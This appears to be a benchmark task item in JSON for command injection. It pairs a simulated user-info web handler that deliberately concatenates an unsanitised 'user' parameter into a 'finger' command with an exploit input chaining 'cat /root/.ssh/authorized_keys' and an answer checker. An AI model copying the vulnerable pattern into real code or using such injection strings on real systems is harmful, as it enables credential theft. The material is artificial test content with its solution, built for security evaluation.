@@ -1,0 +1,28 @@
+{
+  "name": "command_injection__unguided_4",
+  "class": "command_injection",
+  "app_code": "import shlex\nimport re\n\ndef handle(query, state):\n    \"\"\"\n    A simple system information viewer that takes a 'user' parameter\n    and displays information about that user. It shells out to simulate\n    running 'finger' or 'id' commands, but fails to sanitize the user\n    parameter before concatenating it into the command.\n    Vulnerable to OS command injection via semicolon chaining.\n    \"\"\"\n    user = (query.get('user') or [''])[0]\n    \n    if not user:\n        body = 'Usage: ?user=<username>\\n'\n        return 200, {'Content-Type': 'text/plain'}, body\n    \n    files = state.get('files', {})\n    \n    def _arith_expand(token):\n        \"\"\"Expand $((expr)) arithmetic expressions.\"\"\"\n        def _eval(m):\n            expr = m.group(1)\n            if re.match(r'^[0-9+\\-*/() ]+$', expr):\n                try:\n                    return str(eval(expr))  # noqa: S307 - intentional CTF\n                except Exception:\n                    return m.group(0)\n            return m.group(0)\n        return re.sub(r'\\$\\(\\(([^)]+)\\)\\)', _eval, token)\n    \n    def _run_cmd(cmd_str):\n        \"\"\"Execute a single command against the in-memory filesystem.\"\"\"\n        cmd_str = cmd_str.strip()\n        if not cmd_str:\n            return ''\n        \n        try:\n            parts = shlex.split(cmd_str)\n        except ValueError:\n            parts = cmd_str.split()\n        \n        if not parts:\n            return ''\n        \n        prog = parts[0]\n        args = [_arith_expand(a) for a in parts[1:]]\n        \n        if prog == 'cat':\n            if not args:\n                return ''\n            path = args[0]\n            content = files.get(path)\n            if content is None:\n                return f'cat: {path}: No such file or directory'\n            return content\n        elif prog == 'echo':\n            return ' '.join(args)\n        elif prog == 'id':\n            user_arg = args[0] if args else 'root'\n            if user_arg == 'admin':\n                return 'uid=0(admin) gid=0(admin) groups=0(admin)'\n            elif user_arg == 'guest':\n                return 'uid=1001(guest) gid=1001(guest) groups=1001(guest)'\n            else:\n                return f'id: {user_arg}: no such user'\n        elif prog == 'finger':\n            user_arg = args[0] if args else ''\n            if user_arg == 'admin':\n                return 'Login: admin        Name: Administrator\\nDirectory: /root        Shell: /bin/bash'\n            elif user_arg == 'guest':\n                return 'Login: guest        Name: Guest User\\nDirectory: /home/guest     Shell: /bin/nologin'\n            else:\n                return f'finger: {user_arg}: unknown user'\n        else:\n            return f'{prog}: command not found'\n    \n    def _eval_cmd_chain(cmdline):\n        \"\"\"Execute semicolon-separated commands, respecting quotes.\"\"\"\n        segments = []\n        current = []\n        in_sq = False\n        in_dq = False\n        \n        for ch in cmdline:\n            if ch == \"'\" and not in_dq:\n                in_sq = not in_sq\n                current.append(ch)\n            elif ch == '\"' and not in_sq:\n                in_dq = not in_dq\n                current.append(ch)\n            elif ch == ';' and not in_sq and not in_dq:\n                segments.append(''.join(current))\n                current = []\n            else:\n                current.append(ch)\n        \n        if current or segments:\n            segments.append(''.join(current))\n        \n        outputs = []\n        for seg in segments:\n            seg = seg.strip()\n            if seg:\n                out = _run_cmd(seg)\n                if out:\n                    outputs.append(out)\n        \n        return '\\n'.join(outputs)\n    \n    # VULNERABILITY: user parameter is directly concatenated into command string\n    # An attacker can use semicolons to chain arbitrary commands\n    cmd = f'finger {user}'\n    output = _eval_cmd_chain(cmd)\n    \n    body = (\n        '<html><head><title>User Info</title></head><body>'\n        '<h1>User Information</h1>'\n        f'<p>User: <code>{user}</code></p>'\n        '<pre>' + output + '</pre>'\n        '</body></html>'\n    )\n    \n    return 200, {'Content-Type': 'text/html'}, body\n",
+  "state_template": {
+    "files": {
+      "/etc/passwd": "root:x:0:0:root:/root:/bin/bash\nadmin:x:0:0:admin:/root:/bin/bash\nguest:x:1001:1001:guest:/home/guest:/bin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n",
+      "/root/.ssh/authorized_keys": "__FLAG__",
+      "/var/log/system.log": "2026-06-11 08:00:01 system boot\n2026-06-11 08:00:05 loaded modules\n2026-06-11 08:00:10 all services started\n"
+    }
+  },
+  "exploit": {
+    "user": ["admin; cat /root/.ssh/authorized_keys"]
+  },
+  "benign": {
+    "user": ["guest"]
+  },
+  "wrong": {
+    "user": ["$(cat /root/.ssh/authorized_keys)"]
+  },
+  "control": {
+    "query": {
+      "user": ["admin; echo PREFIX$((3+4))SUFFIX"]
+    },
+    "expect": "PREFIX7SUFFIX"
+  },
+  "checker_code": "def check(response, flag):\n    return flag in response\n"
+}
